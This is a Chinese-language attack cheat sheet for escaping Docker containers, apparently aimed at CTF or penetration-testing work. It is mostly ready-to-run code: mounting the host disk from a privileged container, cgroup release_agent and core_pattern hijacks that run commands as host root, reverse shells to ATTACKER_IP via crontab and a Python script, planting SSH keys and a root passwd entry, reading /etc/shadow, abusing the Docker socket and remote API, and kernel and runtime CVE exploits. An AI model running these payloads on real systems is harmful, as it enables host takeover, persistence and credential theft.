# Docker 逃逸方法详解

## 目录

1. [特权容器逃逸](#1-特权容器逃逸)
2. [procfs 挂载逃逸](#2-procfs-挂载逃逸)
3. [Docker Socket 逃逸](#3-docker-socket-逃逸)
4. [Docker Remote API 未授权访问](#4-docker-remote-api-未授权访问)
5. [Docker 用户组提权](#5-docker-用户组提权)
6. [Capabilities 滥用](#6-capabilities-滥用)
7. [内核漏洞逃逸](#7-内核漏洞逃逸)
8. [Docker/容器运行时 CVE](#8-docker容器运行时-cve)
9. [环境变量信息泄露](#9-环境变量信息泄露)
10. [docker-compose 利用](#10-docker-compose-利用)
11. [容器逃逸自动化枚举](#11-容器逃逸自动化枚举)

---

## 1. 特权容器逃逸

### 1.1 磁盘挂载
```bash
# 列出可用设备
fdisk -l 2>/dev/null || lsblk || ls /dev/sd* /dev/vd* /dev/xvd* 2>/dev/null

mkdir -p /tmp/hostroot
mount /dev/sda1 /tmp/hostroot    # 常见: sda1, vda1, xvda1

# 获取 flag
find /tmp/hostroot -name "flag*" 2>/dev/null
cat /tmp/hostroot/root/flag.txt

# 写 SSH 密钥
mkdir -p /tmp/hostroot/root/.ssh
echo "ssh-rsa AAAA... attacker@kali" >> /tmp/hostroot/root/.ssh/authorized_keys
chmod 600 /tmp/hostroot/root/.ssh/authorized_keys

# 写 crontab 反弹 shell
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" > /tmp/hostroot/etc/cron.d/backdoor

# 完全接管
chroot /tmp/hostroot bash
```

### 1.2 cgroup release_agent
```bash
# 适用于 cgroup v1
d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null | head -n1))
if [ -z "$d" ]; then
    # 手动查找
    d=/sys/fs/cgroup/rdma
    [ ! -d "$d" ] && d=/sys/fs/cgroup/memory
fi

mkdir -p $d/x
echo 1 > $d/x/notify_on_release
# 获取容器在宿主机上的路径（upperdir → 取父目录拼 /merged）
upperdir=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/mounts)
host_path=$(dirname "$upperdir")/merged
echo "$host_path/cmd" > $d/release_agent

# 写入要在宿主机执行的命令
cat > /cmd <<'EOF'
#!/bin/sh
cat /etc/shadow > /output_shadow
id > /output_id
cat /root/flag.txt > /output_flag 2>/dev/null
EOF
chmod a+x /cmd

# 触发（进程退出时 cgroup 释放，调用 release_agent）
sh -c "echo \$\$ > $d/x/cgroup.procs"
sleep 2

# 读取结果
cat /output_flag /output_id /output_shadow 2>/dev/null
```

### 1.3 nsenter 逃逸
```bash
# 前提：必须 hostPID=true，否则容器内 PID 1 是容器自身进程，nsenter 无逃逸效果
# 另需 CAP_SYS_ADMIN 或特权模式
# 进入宿主机 PID 1 的所有 namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# 验证是否在宿主机
cat /proc/1/cmdline    # 应该是 systemd/init，不是 bash/node
hostname               # 应该是宿主机名，不是容器 ID

# 现在在宿主机环境中
whoami    # root
cat /root/flag.txt
```

## 2. procfs 挂载逃逸

当宿主机的 `/proc` 被挂载到容器中时，可以利用 `core_pattern` 的管道符语法在宿主机上执行命令。

### 2.1 原理
从 Linux 2.6.19 开始，`/proc/sys/kernel/core_pattern` 的首字符如果是管道符 `|`，剩余内容会被当作用户空间程序执行。容器崩溃时，内核以 root 权限在宿主机上执行该程序。

前提条件：需要宿主机 procfs 被挂载到容器中，且容器有 root 权限。部分环境的 core_pattern 受 sysctl 写保护，需要先确认可写。

### 2.2 检测与利用
```bash
# 检测：找到 core_pattern 文件，判断一个在 /proc 下、一个在其他位置（如 /host/proc）
find / -name core_pattern 2>/dev/null
# /proc/sys/kernel/core_pattern          ← 容器自身的（namespaced，无用）
# /host/proc/sys/kernel/core_pattern     ← 宿主机挂载进来的（可利用）

# 第一步：找到容器在宿主机上的绝对路径
# upperdir 形如 /var/lib/docker/overlay2/<id>/diff，取父目录拼 /merged 得到容器根路径
upperdir=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/mounts)
host_path=$(dirname "$upperdir")/merged
echo "容器在宿主机路径: $host_path"
# 输出类似: /var/lib/docker/overlay2/xxxx/merged

# 第二步：写反弹 shell 脚本
cat > /tmp/.t.py <<'PYEOF'
#!/usr/bin/python3
import os, pty, socket
lhost = "ATTACKER_IP"
lport = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.environ["HISTFILE"] = "/dev/null"
pty.spawn("/bin/bash")
s.close()
PYEOF
chmod +x /tmp/.t.py

# 第三步：覆盖宿主机的 core_pattern
# 管道符 | 后面是宿主机上的脚本路径（需要用容器在宿主机上的绝对路径）
# \r 用于截断后续内容，"core" 是占位后缀（内核以换行/空格为分隔）
# 将路径替换为上面查到的 host_path 路径 + /tmp/.t.py
echo -e "|/var/lib/docker/overlay2/xxxx/merged/tmp/.t.py \rcore " > /host/proc/sys/kernel/core_pattern

# 第四步：触发崩溃，内核将以 root 在宿主机执行反弹 shell
cat > /tmp/crash.c <<'CEOF'
int main(void) { int *a = NULL; *a = 1; return 0; }
CEOF
gcc /tmp/crash.c -o /tmp/crash && /tmp/crash
```

## 3. Docker Socket 逃逸

### 3.1 使用 docker CLI
```bash
# 检查版本
docker version
docker info

# 列出宿主机上所有容器
docker ps -a

# 创建特权容器挂载宿主机
docker run -v /:/hostroot --privileged -it alpine chroot /hostroot bash

# 在已有容器中执行
docker exec -it CONTAINER_ID /bin/bash
```

### 3.2 使用 curl（无 docker CLI）
```bash
SOCK=/var/run/docker.sock

# 列出可用镜像（确保镜像存在）
curl -s --unix-socket $SOCK http://localhost/images/json | python3 -m json.tool

# 获取一个可用镜像名（如果无镜像，使用 alpine 会失败）
IMAGE=$(curl -s --unix-socket $SOCK http://localhost/images/json | python3 -c "import json,sys;imgs=json.load(sys.stdin);print(imgs[0]['RepoTags'][0] if imgs else 'alpine')")

# 创建容器
RESP=$(curl -s --unix-socket $SOCK -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d "{\"Image\":\"$IMAGE\",\"Cmd\":[\"/bin/sh\",\"-c\",\"cat /hostroot/root/flag.txt; id; cat /hostroot/etc/shadow\"],\"HostConfig\":{\"Binds\":[\"/:/hostroot\"],\"Privileged\":true}}")

CID=$(echo $RESP | python3 -c "import json,sys;print(json.load(sys.stdin)['Id'])")

# 启动容器（必须执行此步骤，否则容器不会运行）
curl -s --unix-socket $SOCK -X POST http://localhost/containers/$CID/start

# 等待完成
sleep 2

# 读取输出
curl -s --unix-socket $SOCK "http://localhost/containers/$CID/logs?stdout=true&stderr=true"

# 清理
curl -s --unix-socket $SOCK -X DELETE "http://localhost/containers/$CID?force=true"
```

## 4. Docker Remote API 未授权访问

Docker Daemon 监听在 `0.0.0.0:2375` 时，任何人都可以通过 HTTP API 操作 Docker。

```bash
# 检测：推测宿主机 IP
# 主选：hostname -I 取同网段 .1（Docker 默认 bridge 网关通常是 .1）
IP=$(hostname -I | awk '{print $1}' | awk -F. '{print $1"."$2"."$3".1"}')
# 备选：ip route 取默认网关（适用于自定义网络/macvlan/overlay 网络）
GW=$(ip route | grep default | awk '{print $3}')

# 测试 API 是否暴露（两种 IP 都尝试）
curl -s http://$IP:2375/version 2>/dev/null && echo "Docker API EXPOSED on $IP:2375"
curl -s http://$GW:2375/version 2>/dev/null && echo "Docker API EXPOSED on $GW:2375"

# 更精确检测：用 tcp 连接测试
timeout 3 bash -c "echo >/dev/tcp/$GW/2375" 2>/dev/null && echo "Port 2375 OPEN"

# 利用：远程创建特权容器挂载宿主机
docker -H tcp://$IP:2375 run -it -v /:/mnt nginx:latest /bin/bash
# 或用网关 IP
docker -H tcp://$GW:2375 run -it -v /:/mnt nginx:latest /bin/bash

# 无 docker CLI 时用 curl
curl -s http://$IP:2375/containers/json | python3 -m json.tool

# 查询可用镜像
IMAGE=$(curl -s http://$IP:2375/images/json | python3 -c "import json,sys;imgs=json.load(sys.stdin);print(imgs[0]['RepoTags'][0] if imgs else 'alpine')")

# 创建容器
CID=$(curl -s -X POST http://$IP:2375/containers/create \
  -H "Content-Type: application/json" \
  -d "{\"Image\":\"$IMAGE\",\"Cmd\":[\"cat\",\"/mnt/root/flag.txt\"],\"HostConfig\":{\"Binds\":[\"/:/mnt\"],\"Privileged\":true}}" \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['Id'])")

# 启动 + 读结果
curl -s http://$IP:2375/containers/$CID/start
sleep 2
curl -s "http://$IP:2375/containers/$CID/logs?stdout=true&stderr=true"
```

## 5. Docker 用户组提权

宿主机上的普通用户如果在 `docker` 组中，可以直接获得 root 权限。

```bash
# 检测：当前用户是否在 docker 组
id
groups
cat /etc/group | grep docker

# 方法 1：直接挂载宿主机根目录
docker run -v /:/hostOS -it ubuntu chroot /hostOS bash

# 方法 2：读取 shadow 并添加 root 用户
docker run -v /etc:/host_etc -it alpine cat /host_etc/shadow

# 生成密码哈希
openssl passwd -1 -salt hacker password123
# $1$hacker$DjdtjGphJ7LiFvrFDTFd1.

# 写入新用户到 passwd
echo "hacker:\$1\$hacker\$DjdtjGphJ7LiFvrFDTFd1.:0:0:root:/root:/bin/bash" >> /host_etc/passwd

# 或使用现成工具
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```

## 6. Capabilities 滥用

### 6.1 CAP_SYS_ADMIN
```bash
# 可以 mount
mount -t proc proc /mnt    # 访问宿主机 proc
mount /dev/sda1 /mnt       # 挂载宿主机磁盘

# cgroup release_agent（见 1.2 节）
```

### 6.2 CAP_SYS_PTRACE（+ hostPID）
```bash
# 注入宿主机进程
# 找到宿主机上的进程
ps aux | grep -v "container\|kube"

# 使用 nsenter 进入宿主机进程的 namespace（前提：hostPID=true）
nsenter -t HOST_PID -m -u -i -n -p -- /bin/bash

# 或用 gdb/strace 注入
```

### 6.3 CAP_DAC_READ_SEARCH
```bash
# 可以读任意文件（绕过权限检查）
# 利用 shocker 漏洞原理
# 工具：https://github.com/gabber12/shocker
```

### 6.4 CAP_NET_ADMIN + CAP_NET_RAW
```bash
# ARP 欺骗/嗅探宿主机网络流量
# 在 hostNetwork 模式下特别有效
tcpdump -i eth0 -w /tmp/capture.pcap
```

## 7. 内核漏洞逃逸

容器共享宿主机内核，内核漏洞在容器内同样可以利用。

### 7.1 DirtyPipe (CVE-2022-0847)
```
影响版本: Linux >= 5.8，各稳定分支修复版本：
  5.16.11, 5.15.25, 5.10.102, 5.4.181
即：内核 >= 5.8 且低于对应分支修复版本的都受影响
参考: https://dirtypipe.cm4all.com/
```
```bash
uname -r    # 确认版本

# 路径 1：覆盖 /etc/passwd
# 工具: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
# exploit-1.c: 将 root 密码替换为 "pipe"，备份到 /tmp/passwd.bak

# 路径 2：SUID 二进制文件劫持
find / -perm -4000 2>/dev/null    # 查找 SUID 二进制
# exploit-2.c: 注入以 root 运行的 SUID 进程

# 路径 3：配合 CAP_DAC_READ_SEARCH，通过 open_by_handle_at 获取宿主机文件描述符
#         再用 DirtyPipe 覆盖宿主机文件（绕过 runc 只读挂载修复）
```

### 7.2 DirtyCow (CVE-2016-5195)
```
影响版本: Linux >= 2.6.22，2016年10月各稳定分支修复
即：几乎所有 2016年10月之前的 Linux 内核都受影响
```
```bash
uname -r    # 内核版本确认

# 利用工具
# https://github.com/gbonacini/CVE-2016-5195
git clone https://github.com/gbonacini/CVE-2016-5195 && cd CVE-2016-5195
make
./dcow -s       # 自动获取 root shell，恢复 passwd
./dcow -s -n    # 获取 root shell，不恢复 passwd
```

### 7.3 CVE-2022-23222 (BPF 验证器绕过)
```
影响版本: Linux 5.8.0 - 5.16
```
```bash
# BPF verifier 的 adjust_ptr_min_max_vals() 存在绕过
# 工具: https://github.com/tr3ee/CVE-2022-23222
git clone https://github.com/tr3ee/CVE-2022-23222
make && ./exploit

# 缓解措施
sysctl kernel.unprivileged_bpf_disabled=1
```

### 7.4 CVE-2021-22555 (Netfilter 提权)
```
影响版本: Linux 2.6.19 - 5.12
前提: CONFIG_USER_NS 和 CONFIG_NET_NS 已启用
```
```bash
gcc -m32 -static -o exploit CVE_2021_22555_exploit.c
./exploit
```

### 7.5 CVE-2021-3493 (OverlayFS 提权)
```
影响版本: Ubuntu 14.04 - 20.10（Ubuntu 特定）
```
```bash
gcc exploit.c -o exploit
./exploit shell     # 获取 root shell
./exploit command   # 以 root 执行命令
```

### 7.6 CVE-2020-14386 (网络数据包处理)
```
影响版本: Linux 4.6 - 5.9
```
内核网络数据包处理中的堆溢出，可从容器利用。

### 7.7 CVE-2017-1000112 (UDP 路径 MTU)
```
影响版本: Linux < 4.13
```
UDP 路径 MTU 处理中的内存损坏漏洞。

## 8. Docker/容器运行时 CVE

### 8.1 runc 逃逸 (CVE-2019-5736)
```
影响版本: runc < 1.0-rc6
```
```bash
# 容器内通过 /proc/self/exe 覆盖宿主机 runc 二进制
# 下次 docker exec 时触发
# 工具: https://github.com/Frichetten/CVE-2019-5736-PoC

# DirtyPipe (CVE-2022-0847) 可以绕过为修复此漏洞而设的只读挂载
# 即：DirtyPipe + CVE-2019-5736 方法 = 绕过只读保护覆写 runc
```

### 8.2 CVE-2019-16884 (AppArmor 绕过)
```bash
# 检测 AppArmor 是否启用
cat /sys/module/apparmor/parameters/enabled   # Y = 启用

# 构造恶意镜像绕过 AppArmor 的 VOLUME /proc 限制
mkdir -p rootfs/proc/self/{attr,fd}
touch rootfs/proc/self/{status,attr/exec}
touch rootfs/proc/self/fd/{4,5}
cat <<EOF > Dockerfile
FROM busybox
ADD rootfs /
VOLUME /proc
EOF
docker build -t apparmor-bypass .
docker run --rm --security-opt "apparmor=no_flag" -v /tmp/flag:/flag apparmor-bypass cat /flag
```

### 8.3 CVE-2020-15257 (containerd-shim)
```
影响版本: containerd < 1.4.3 / < 1.3.9
前提: 容器使用 containerd 运行时且网络命名空间可访问 shim 的 abstract Unix socket
```
```bash
# 利用方式：通过 /proc/net/unix 找到 containerd-shim 的 abstract socket
# 然后通过 shim API 创建新的容器进程实现逃逸
# 工具: https://github.com/nicekey/CVE-2020-15257
# 检测: cat /proc/net/unix | grep containerd-shim
```

### 8.4 CVE-2022-0492 (cgroup 限制绕过)
```bash
# 前提: CAP_SYS_ADMIN + apparmor=unconfined
# 利用 cgroup release_agent 机制（详见 1.2 节）
# 影响：可从容器内逃逸到宿主机
```

### 其他 Docker CVE 速查
| CVE | 类型 | 影响版本 |
|-----|------|----------|
| CVE-2018-15664 | symlink 竞争条件 | Docker < 18.09.4 |
| CVE-2019-14271 | cp 命令动态库注入 | Docker 19.03.x |

## 9. 环境变量信息泄露

```bash
# Docker 容器环境变量常含敏感信息
env | sort
cat /proc/self/environ | tr '\0' '\n'

# 通过 Docker API 读取其他容器的环境变量
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | \
  python3 -c "import json,sys;[print(c['Id'][:12],c['Image']) for c in json.load(sys.stdin)]"

# 逐个检查
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/CONTAINER_ID/json | \
  python3 -c "import json,sys;d=json.load(sys.stdin);[print(e) for e in d['Config'].get('Env',[])]"
```

## 10. docker-compose 利用

如果发现 docker-compose.yml：
```bash
find / -name "docker-compose*" 2>/dev/null
# 查看配置中的密码、挂载点、网络配置
cat /path/to/docker-compose.yml
```

## 11. 容器逃逸自动化枚举

### CDK — 容器渗透工具包（推荐）

CDK 是功能最全的容器/K8s 渗透工具，支持信息收集、逃逸利用、网络探测一体化，已集成到 arsenal 投递库：

```bash
# 从 arsenal 投递到目标容器后运行
./cdk evaluate  # 自动枚举所有逃逸路径

# 指定利用方式
./cdk run shim-pwn          # runc CVE-2019-5736
./cdk run docker-sock-check # Docker socket 检查
./cdk run mount-cgroup      # cgroup 逃逸（privileged）
./cdk run cap-dac-read      # CAP_DAC_READ_SEARCH 利用
./cdk run service-probe     # K8s API / etcd / kubelet 探测

# 网络探测
./cdk probe 10.0.0.0/24 22,80,443,2379,6443,8080,10250
```

### deepce — 备选方案

轻量级 shell 脚本，无需编译，适合无法投递二进制的场景：

```bash
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh
chmod +x /tmp/deepce.sh
/tmp/deepce.sh
```
